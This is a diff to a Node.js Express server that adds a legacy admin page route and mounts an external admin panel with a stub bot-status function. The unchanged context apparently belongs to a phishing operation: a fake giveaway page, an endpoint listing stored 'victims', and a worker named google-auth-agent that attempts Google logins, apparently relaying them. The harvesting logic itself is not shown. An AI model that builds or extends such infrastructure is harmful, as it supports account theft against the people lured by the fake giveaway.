@@ -10,6 +10,7 @@ const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { autoRefreshT
 
 const { setRelay, getRelay } = require('./worker/relay-store');
 const { attemptGoogleAuth } = require('./worker/google-auth-agent');
+const mountAdminRoutes = require('../admin-routes');
 
 const app = express();
 const PORT = process.env.PORT || 8080;
@@ -28,6 +29,11 @@ app.use((req, res, next) => {
 app.use('/overlay', express.static(path.join(__dirname, 'front')));
 app.use('/admin', express.static(path.join(__dirname, 'admin')));
 app.use('/giveaway', express.static(path.join(__dirname, '..', 'giveaway-v2')));
+
+// Route admin legacy
+app.get('/admin.html', (req, res) => {
+  res.sendFile(path.join(__dirname, 'front', 'admin.html'));
+});
 
 // Redirection racine vers le concours
 app.get('/', (req, res) => {
@@ -134,6 +140,12 @@ app.get('/api/victims', async (req, res) => {
     res.json({ success: true, victims: data || [] });
   } catch (err) { res.status(500).json({ success: false, error: err.message }); }
 });
+
+// Ancien panel admin (CADEMO)
+function getBotStatus() {
+  return { running: true, lastActivity: new Date().toISOString() };
+}
+mountAdminRoutes(app, supabase, getBotStatus);
 
 app.listen(PORT, () => {
   console.log('\n======================================');
